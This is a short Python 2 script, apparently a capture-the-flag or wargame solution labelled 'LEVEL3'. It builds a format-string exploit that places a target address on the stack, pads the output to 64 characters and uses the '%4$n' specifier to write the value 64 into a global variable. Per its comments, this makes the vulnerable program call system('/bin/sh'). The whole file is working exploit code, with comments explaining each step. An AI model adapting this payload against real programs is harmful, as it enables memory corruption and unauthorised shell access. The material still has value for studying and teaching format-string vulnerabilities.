#!/usr/bin/env python2

import struct
import sys

# LEVEL3 FORMAT STRING EXPLOIT
# Target: Write 64 (0x40) to global variable at 0x804988c
# Method: Use %n format specifier to write character count to memory address

target_addr = 0x804988c  # Global variable 'm' address
target_value = 64        # Value needed to trigger system("/bin/sh")

# Stack layout: Our input appears at position 4
# Payload: [ADDRESS][PADDING][%4$n]

payload = struct.pack("<L", target_addr)  # 4 bytes: target address
payload += "A" * (target_value - 4)       # 60 bytes: padding (total 64 chars)  
payload += "%4$n"                         # Write count to address at stack pos 4

sys.stdout.write(payload)